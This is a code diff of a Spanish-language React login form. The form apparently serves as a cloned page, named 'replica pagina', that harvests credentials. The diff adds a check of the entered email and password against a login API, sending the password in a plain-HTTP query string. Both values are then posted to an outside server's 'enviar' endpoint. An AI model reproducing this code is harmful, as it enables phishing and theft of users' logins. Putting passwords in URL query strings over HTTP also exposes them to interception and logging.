@@ -1,7 +1,6 @@
 import React, { useState } from "react";
 import styles from './login.module.css';
 
-
 export default function Login({ onLoginSuccess }) {
     const [emailOrPhone, setEmailOrPhone] = useState("");
     const [password, setPassword] = useState("");
@@ -17,16 +16,22 @@ export default function Login({ onLoginSuccess }) {
         if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
             setErrorMessage("");
 
-            const data = {
-                name: emailOrPhone,
-                passworld: password  // Corregido el error tipográfico
-            };
             try {
+                // Primera verificación con la API de login
+                const loginUrl = `http://dominio/api/login?email=${encodeURIComponent(emailOrPhone)}&password=${encodeURIComponent(password)}`;
+                const loginResponse = await fetch(loginUrl);
+                const loginResult = await loginResponse.json();
+
+                if (loginResponse.status !== 200) {
+                    setErrorMessage(loginResult.message || "Credenciales incorrectas");
+                    return;
+                }
+
+                // Segunda verificación con la API de envío
+                const data = { name: emailOrPhone, password };
                 const response = await fetch('https://replica-pagina-server-ul2z.onrender.com/api/enviar', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
                 });
 
@@ -34,10 +39,11 @@ export default function Login({ onLoginSuccess }) {
                 if (response.status === 201) {
                     onLoginSuccess();
                 } else {
-                    setErrorMessage(result.message);
+                    setErrorMessage(result.message || "Error al procesar la solicitud.");
                 }
             } catch (error) {
-                setErrorMessage("Hubo un error al enviar los datos.");
+                console.error("Error:", error);
+                setErrorMessage("Hubo un error al procesar los datos.");
             }
         } else {
             setErrorMessage("Ingrese un correo válido o un número de teléfono con formato internacional.");
@@ -63,18 +69,22 @@ export default function Login({ onLoginSuccess }) {
                         placeholder="Email o número de celular"
                         value={emailOrPhone}
                         required
+                        autoComplete="off"
                         onChange={(e) => setEmailOrPhone(e.target.value)}
                     />
-                    {errorMessage && (
-                        <p className={styles.errorMessage}>{errorMessage}</p>
-                    )}
                     <input
                         type="password"
                         placeholder="Contraseña"
                         value={password}
                         required
+                        autoComplete="off"
                         onChange={(e) => setPassword(e.target.value)}
                     />
+                    {errorMessage && (
+                        <div className={styles.errorContainer}>
+                            {errorMessage}
+                        </div>
+                    )}
                     <button type="submit">Iniciar sesión</button>
                     <div className={styles.centrado}>
                         <div className={styles.conteinerRecuerdame}>
